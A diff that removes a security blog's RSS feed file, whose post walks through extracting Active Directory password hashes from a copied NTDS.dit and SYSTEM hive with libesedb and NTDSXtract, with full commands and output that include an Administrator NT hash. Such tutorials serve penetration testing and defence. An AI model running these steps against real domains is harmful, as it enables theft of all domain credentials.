@@ -1,736 +1,114 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>cracking on malicious.link</title>
-    <link>https://malicious.link/categories/cracking/</link>
-    <description>Recent content in cracking on malicious.link</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Tue, 11 Jun 2013 13:55:21 +0000</lastBuildDate>
-    
-        <atom:link href="https://malicious.link/categories/cracking/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Volume Shadow Copy NTDS.DIT Domain Hashes Remotely - Part 2</title>
-      <link>https://malicious.link/post/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</link>
-      <pubDate>Tue, 11 Jun 2013 13:55:21 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2013/2013-06-11-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-2/</guid>
-      <description>&lt;p&gt;Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:&lt;/p&gt;
-&lt;p&gt;From: &lt;a href=&#34;http://www.ntdsxtract.com/&#34;&gt;http://www.ntdsxtract.com/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Download: &lt;a href=&#34;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&#34;&gt;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From: &lt;a href=&#34;http://code.google.com/p/libesedb/&#34;&gt;http://code.google.com/p/libesedb/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Download: &lt;a href=&#34;https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz&#34;&gt;https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Extract the tools:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar zxvf libesedb-alpha-20120102.tar.gz
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unzip ntdsxtract_v1_0.zip
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compile/make libesedb:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/# cd libesedb-20120102
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102# ./configure 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102# make
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Export the tables from NTDS.dit:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102# cd esedbtools/
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;esedbexport &lt;span style=&#34;color:#ae81ff&#34;&gt;20120102&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Missing source file.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use esedbexport to export items stored in an Extensible Storage Engine &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ESE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Database &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;EDB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; file
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: esedbexport &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -c codepage &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -l logfile &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -m mode &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -t target &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -T table_name &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -hvV &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; source
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	source: the source file
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-c:     codepage of ASCII strings, options: ascii, windows-874,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        windows-932, windows-936, windows-1250, windows-1251,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        windows-1252 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, windows-1253, windows-1254
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        windows-1255, windows-1256, windows-1257 or windows-1258
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-h:     shows this help
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-l:     logs information about the exported items
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-m:     export mode, option: all, tables &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;all&amp;#39;&lt;/span&gt; exports all the tables or a single specified table with indexes,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tables&amp;#39;&lt;/span&gt; exports all the tables or a single specified table
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-t:     specify the basename of the target directory to export to
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is the source filename&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; esedbexport will add the suffix
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        .export to the basename
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-T:     exports only a specific table
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-v:     verbose output to stderr
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-V:     print version
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport ../../ntds.dit 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;esedbexport &lt;span style=&#34;color:#ae81ff&#34;&gt;20120102&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Opening file.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysObjects&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysObjectsShadow&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysUnicodeFixupVer2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datatable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;hiddentable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;link_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sdpropcounttable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sdproptable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sd_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysDefrag2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;quota_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;quota_rebuild_progress_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Export completed.
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Move the exported tables to somewhere a bit easier:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# mv ntds.dit.export/ ../../
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NTDS extract can do a lot more than just hashes:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog# cd NTDSXtract 1.0/
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# ls
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dscomputers.py  dsdeletedobjects.py  dsfileinformation.py  dsgroups.py  dstimeline.py  dsusers.py  framework  ntds
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DSUsers
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Extracts information related to user objects
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usage: dsusers.py   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;option&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  options:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --rid 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          List user identified by RID
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --name 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          List user identified by Name
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --passwordhashes 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          Extract password hashes
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --passwordhistory 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          Extract password history
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --certificates
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          Extract certificates
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --supplcreds 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          Extract kerberos keys
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --membership
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          List groups of which the user is a member
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# 
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But we like hashes:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Running with options:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Extracting password hashes
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Extracting password history
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Initialising engine...
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Scanning database - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3475&lt;/span&gt; records processed
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Extracting schema information - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1549&lt;/span&gt; records processed
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Extracting object links...
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;List of users:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==============&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3562&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           Administrator
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    Administrator
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: 7ceee337-fa58-4ca0-9643-540a40161020
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-500
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 03:12:59
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-05-15 04:06:55
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2012-08-22 02:49:42.899576
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-05-15 04:08:04.547236
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-05-15 04:06:55.577353
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     2013-06-07 02:34:34.560516
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users Administrator 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Administrator:$NT$88e4d9fabaecf3ded18dd80905521b29:::
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3563&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           Guest
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    Guest
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: 659723d7-1246-4959-b0fc-af80ea5e3816
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-501
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 03:12:59
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-03-14 06:54:22
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2013-03-14 06:54:22.029303
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-03-14 06:54:27.012817
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-03-14 06:32:41.834022
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     2013-06-07 03:07:46.499917
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Not Required
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Never Expires
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users Guest 
